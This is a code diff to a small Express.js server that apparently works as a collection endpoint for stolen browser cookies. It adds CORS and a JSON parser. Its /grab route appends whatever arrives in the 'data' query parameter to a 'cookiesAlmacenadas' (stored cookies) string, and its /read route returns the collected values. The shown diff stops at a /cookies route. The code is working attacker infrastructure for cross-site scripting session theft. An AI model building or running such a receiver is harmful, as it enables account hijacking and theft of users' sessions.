@@ -1,9 +1,12 @@
 const express = require ('express');
 const bodyParser = require('body-parser');
+const cors = require('cors');
 const app = express();
 
-let texto = "";
 let cookiesAlmacenadas = "";
+
+app.use(cors());
+app.use(bodyParser.json());
 
 app.get('/', (req, res)=> {
     console.log("Ta bien");
@@ -12,12 +15,12 @@ app.get('/', (req, res)=> {
 
 app.get('/grab', (req, res)=> {
     const data = req.query.data;
-    texto += data;
+    cookiesAlmacenadas += " " + data;
     res.send(data);
 });
 
 app.get('/read', (req, res)=> {
-    res.send(texto);
+    res.send(cookiesAlmacenadas);
 });
 
 app.get('/cookies', (req, res) => {
